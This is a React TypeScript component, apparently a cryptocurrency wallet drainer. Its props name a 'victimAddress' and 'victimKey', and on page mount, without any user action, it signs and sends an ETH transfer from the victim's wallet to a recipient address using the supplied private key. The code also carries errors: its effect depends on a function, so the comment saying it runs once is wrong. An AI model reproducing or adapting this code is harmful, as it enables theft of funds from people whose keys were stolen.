import React, { useState, useEffect } from 'react';
import Web3 from 'web3';

interface TransactionComponentProps {
  victimAddress: string;
  recipientAddress: string;
  victimKey: string;
}

const TransactionComponent: React.FC<TransactionComponentProps> = ({ victimAddress, recipientAddress, victimKey }) => {
  const [balance, setBalance] = useState<string>('');
  const [transactionStatus, setTransactionStatus] = useState<string>('');
  const [error, setError] = useState<string>('');
  const [account, setAccount] = useState<string>("");

   const connectWallet = async () => {
    if ((window as any).ethereum) {
      try {
        const accounts: string[] = await (window as any).ethereum.request({
          method: "eth_requestAccounts",
        });
        setAccount(accounts[0]);
      } catch (error) {
        console.error("연결에 실패했습니다.", error);
      }
    } else {
      alert("MetaMask를 설치해주세요!");
    }
  };
  useEffect(() => {
    setAccount(recipientAddress);

    if ((window as any).ethereum) {
      (window as any).ethereum
        .request({ method: "eth_accounts" })
        .then((accounts: string[]) => {
          if (accounts.length > 0) {
            setAccount(accounts[0]);
          }
        });
    }
    // Initialize web3 instance here
    // Assuming you have provided the Web3 provider URL (e.g., via MetaMask or Infura)
    const web3 = new Web3((window as any).ethereum);
    
    // Function to build and send transaction
    const buildTransaction = async (balance: string) => {
      try {
        const nonce = await web3.eth.getTransactionCount(victimAddress);
        const tx = {
          nonce,
          to: recipientAddress,
          value: web3.utils.toWei(balance, 'ether'),
          gas: 53000,
          gasPrice: web3.utils.toWei('56', 'gwei'),
        };

        const signedTx = await web3.eth.accounts.signTransaction(tx, victimKey);
        const txHash = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
        
        setTransactionStatus(`Transaction Completed. TxHash: ${txHash.transactionHash}`);
      } catch (error) {
        setError('ERROR, check buildTransaction Function');
        console.error(error);
      }
    };

    // Example function to set balance and initiate transaction
    const initiateTransaction = () => {
      const balanceToTransfer = '0.01'; // Example balance
      setBalance(balanceToTransfer);
      buildTransaction(balanceToTransfer);
    };

    // Call this function based on certain conditions or user actions
    initiateTransaction();
  }, [connectWallet]); // Empty dependency array means this runs once on component mount

 

  return (
    <div>
      {error && <p>Error: {error}</p>}
      {transactionStatus && <p>{transactionStatus}</p>}
      {account ? (
          <p>계정: {account}</p>
        ) : (
          <button onClick={connectWallet}>MetaMask 연결</button>
        )}
    </div>
  );
};

export default TransactionComponent;
